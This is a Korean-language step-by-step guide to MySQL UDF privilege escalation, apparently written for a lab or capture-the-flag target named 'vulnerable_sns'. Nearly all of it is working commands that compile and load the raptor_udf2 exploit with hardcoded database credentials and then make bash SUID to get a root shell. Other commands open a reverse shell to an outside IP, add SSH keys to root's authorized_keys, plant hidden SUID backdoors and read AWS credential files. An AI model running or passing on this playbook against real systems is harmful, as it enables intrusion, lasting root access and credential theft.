# MySQL UDF 권한 상승 - 상세 가이드

## 왜 MySQL UDF가 가장 유망한가?

1. ✅ 이미 MySQL 접근 가능 (webuser/WebPassw0rd!)
2. ✅ vulnerable_sns DB에 접근 가능
3. ✅ 파일 읽기/쓰기 가능성 높음 (@@secure_file_priv 확인 필요)
4. ✅ gcc 설치됨 (컴파일 가능)

---

## 단계별 실행

### 1단계: MySQL 권한 정확히 확인

```bash
mysql -u webuser -p'WebPassw0rd!' << 'CHECKEOF'
-- 플러그인 디렉토리
SELECT @@plugin_dir;

-- 파일 제한 확인 (NULL이면 제한 없음!)
SELECT @@secure_file_priv;

-- MySQL 버전
SELECT VERSION();

-- webuser 권한
SELECT user, host, Super_priv, File_priv, Insert_priv, Create_priv
FROM mysql.user
WHERE user='webuser';

-- 현재 사용자
SELECT USER(), CURRENT_USER();

-- Grants
SHOW GRANTS FOR CURRENT_USER();

-- mysql DB 접근 가능한지
USE mysql;
SHOW TABLES;
CHECKEOF
```

**중요:**
- `@@secure_file_priv`가 `NULL`이면 → 파일 읽기/쓰기 제한 없음 (성공 확률 높음)
- `@@secure_file_priv`가 `/var/lib/mysql-files/` 등이면 → 해당 디렉토리에만 쓰기 가능
- `File_priv`가 `Y`이면 → LOAD_FILE/INTO OUTFILE 사용 가능

---

### 2단계: raptor_udf2.so 준비

#### 방법 A: 타겟에서 직접 컴파일 (가장 빠름)

```bash
cd /tmp

# exploit 다운로드
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

# PATH 설정
export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"

# 컴파일
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 확인
ls -la raptor_udf2.so
file raptor_udf2.so
md5sum raptor_udf2.so
```

**컴파일 성공하면 3단계로**

#### 방법 B: C2 서버에서 컴파일 후 전송 (컴파일 실패시)

**C2 서버 (ubuntu@ip-10-0-3-106):**

```bash
cd /tmp
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

# Amazon Linux 2023과 호환되는 방식으로 컴파일
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# base64 인코딩
base64 raptor_udf2.so | tr -d '\n' > raptor.b64
cat raptor.b64
```

**타겟에서:**

```bash
cd /tmp
cat > raptor.b64 << 'B64EOF'
[base64 문자열 붙여넣기]
B64EOF

base64 -d raptor.b64 > raptor_udf2.so
chmod +x raptor_udf2.so
ls -la raptor_udf2.so
file raptor_udf2.so
```

---

### 3단계: MySQL에 UDF 로드

#### 시나리오 A: mysql DB 접근 가능한 경우

```bash
mysql -u webuser -p'WebPassw0rd!' << 'LOADEOF'
USE mysql;

-- 임시 테이블 생성
CREATE TABLE IF NOT EXISTS temp_udf(line blob);
DELETE FROM temp_udf;

-- .so 파일 로드
INSERT INTO temp_udf VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));

-- 플러그인 디렉토리로 복사
SELECT * FROM temp_udf INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';

-- UDF 함수 생성
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- 확인
SELECT * FROM mysql.func WHERE name='do_system';
LOADEOF
```

**성공하면 4단계로**

#### 시나리오 B: mysql DB 접근 불가능한 경우 (현재 상황)

**vulnerable_sns DB 사용:**

```bash
mysql -u webuser -p'WebPassw0rd!' << 'LOADEOF'
USE vulnerable_sns;

-- 임시 테이블 생성
CREATE TABLE IF NOT EXISTS temp_udf(line blob);
DELETE FROM temp_udf;

-- .so 파일 로드
INSERT INTO temp_udf VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
LOADEOF
```

**문제:** `INTO DUMPFILE`로 플러그인 디렉토리에 쓰기 위해서는 mysql DB 접근이 필요할 수 있음.

**해결책 1: 다른 쓰기 가능한 위치 시도**

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'WRITEEOF'
-- /tmp에 먼저 쓰기 시도
SELECT * FROM temp_udf INTO DUMPFILE '/tmp/test_udf.so';
WRITEEOF

# 파일이 생성되었는지 확인
ls -la /tmp/test_udf.so

# 플러그인 디렉토리가 심볼릭 링크인지 확인
ls -la /usr/lib64/mariadb/plugin/

# 직접 복사 가능한지 (apache 권한으로)
cp /tmp/raptor_udf2.so /usr/lib64/mariadb/plugin/ 2>&1
```

**해결책 2: MySQL 설정 파일 확인**

```bash
# my.cnf에서 플러그인 디렉토리 확인
cat /etc/my.cnf
cat /etc/my.cnf.d/*.cnf
grep -r "plugin" /etc/my.cnf* 2>/dev/null

# MySQL이 접근 가능한 디렉토리
mysql -u webuser -p'WebPassw0rd!' -e "SHOW VARIABLES LIKE 'datadir';"

# datadir에 쓰기 시도
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'DUMPEOF'
SELECT * FROM temp_udf INTO DUMPFILE '/var/lib/mysql/raptor_udf2.so';
DUMPEOF
```

**해결책 3: root 권한 없이 UDF 로드 (비표준)**

일부 MySQL 설정에서는 사용자 정의 플러그인 디렉토리 사용 가능:

```bash
# 현재 사용자가 쓰기 가능한 디렉토리에 .so 파일 배치
mkdir -p ~/lib/plugin 2>/dev/null
cp /tmp/raptor_udf2.so ~/lib/plugin/

# MySQL에서 해당 경로 사용 시도
mysql -u webuser -p'WebPassw0rd!' -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME '~/lib/plugin/raptor_udf2.so';"
```

---

### 4단계: UDF 함수 실행

UDF가 성공적으로 로드되면:

```bash
# SUID bash 생성
mysql -u webuser -p'WebPassw0rd!' -e "SELECT do_system('chmod u+s /bin/bash');"

# 확인
ls -la /bin/bash

# Root 쉘 획득
/bin/bash -p
whoami
id
```

**또는 다른 명령:**

```bash
# 역리버스 쉘
mysql -u webuser -p'WebPassw0rd!' -e "SELECT do_system('bash -c \"bash -i >& /dev/tcp/13.158.67.78/4445 0>&1\"');"

# SSH 키 추가
mysql -u webuser -p'WebPassw0rd!' -e "SELECT do_system('mkdir -p /root/.ssh && echo \"ssh-rsa [공개키]\" >> /root/.ssh/authorized_keys');"

# 백도어 SUID 바이너리
mysql -u webuser -p'WebPassw0rd!' -e "SELECT do_system('cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor');"
```

---

## 트러블슈팅

### 문제 1: `ERROR 1044: Access denied to database 'mysql'`

**해결:**
- vulnerable_sns DB 사용
- 다른 방법으로 플러그인 디렉토리 접근

### 문제 2: `LOAD_FILE()` returns NULL

**원인:**
- @@secure_file_priv 제한
- 파일 권한 문제
- 파일 경로 오류

**해결:**
```bash
# 파일 존재 및 권한 확인
ls -la /tmp/raptor_udf2.so

# 읽기 가능하게 변경
chmod 644 /tmp/raptor_udf2.so

# MySQL이 읽을 수 있는지 확인
sudo -u mysql cat /tmp/raptor_udf2.so > /dev/null 2>&1 && echo "Readable" || echo "Not readable"
```

### 문제 3: `INTO DUMPFILE` 실패

**원인:**
- 대상 디렉토리 쓰기 권한 없음
- @@secure_file_priv 제한

**해결:**
```bash
# 쓰기 가능한 다른 위치 찾기
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@datadir;"

# /tmp에 먼저 시도
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM temp_udf INTO DUMPFILE '/tmp/test_write.so';"
ls -la /tmp/test_write.so
```

### 문제 4: `CREATE FUNCTION` 실패

**원인:**
- .so 파일이 플러그인 디렉토리에 없음
- 권한 문제
- 아키텍처 불일치

**해결:**
```bash
# 플러그인 디렉토리 확인
ls -la /usr/lib64/mariadb/plugin/

# .so 파일 확인
file /usr/lib64/mariadb/plugin/raptor_udf2.so

# MySQL 로그 확인
sudo tail -50 /var/log/mariadb/mariadb.log
```

---

## 대안: lib_mysqludf_sys

raptor_udf2가 안되면:

```bash
cd /tmp
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys

# 컴파일
gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so -fPIC

# MySQL에 로드
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'SYSEOF'
CREATE TABLE IF NOT EXISTS udf_data(line blob);
INSERT INTO udf_data VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys/lib_mysqludf_sys.so'));
SELECT * FROM udf_data INTO DUMPFILE '/usr/lib64/mariadb/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('chmod u+s /bin/bash');
SYSEOF
```

---

## 최종 체크리스트

- [ ] MySQL에 webuser로 접근 가능
- [ ] `@@secure_file_priv` 확인 (NULL이 최상)
- [ ] `File_priv = Y` 확인
- [ ] raptor_udf2.so 컴파일 완료
- [ ] LOAD_FILE로 .so 파일 읽기 성공
- [ ] INTO DUMPFILE로 플러그인 디렉토리 쓰기 성공
- [ ] CREATE FUNCTION 성공
- [ ] do_system 함수 실행 가능
- [ ] SUID bash 생성 또는 root 명령 실행

---

## 핵심 명령어 (한번에 실행)

```bash
cd /tmp
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"
gcc -g -c raptor_udf2.c -fPIC && gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc && chmod 644 raptor_udf2.so

mysql -u webuser -p'WebPassw0rd!' << 'EOF'
USE vulnerable_sns;
CREATE TABLE IF NOT EXISTS udf_temp(line blob);
DELETE FROM udf_temp;
INSERT INTO udf_temp VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
EOF

# mysql DB 접근 시도
mysql -u webuser -p'WebPassw0rd!' mysql << 'EOF2'
SELECT * FROM vulnerable_sns.udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
EOF2

ls -la /bin/bash
/bin/bash -p -c "whoami && id"
```

---

## 성공 후 할 일

```bash
# Root 확인
whoami
id

# 플래그 찾기
find / -name "*flag*" -type f 2>/dev/null | head -10
cat /root/flag.txt 2>/dev/null
cat /home/*/flag.txt 2>/dev/null

# 영구 백도어
cp /bin/bash /tmp/.rootbash
chmod u+s /tmp/.rootbash

# SSH 키 추가
mkdir -p /root/.ssh
echo "ssh-rsa [공개키]" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# AWS 크레덴셜
cat /root/.aws/credentials 2>/dev/null
cat /home/*/.aws/credentials 2>/dev/null

# 시스템 정보
uname -a
cat /etc/os-release
```
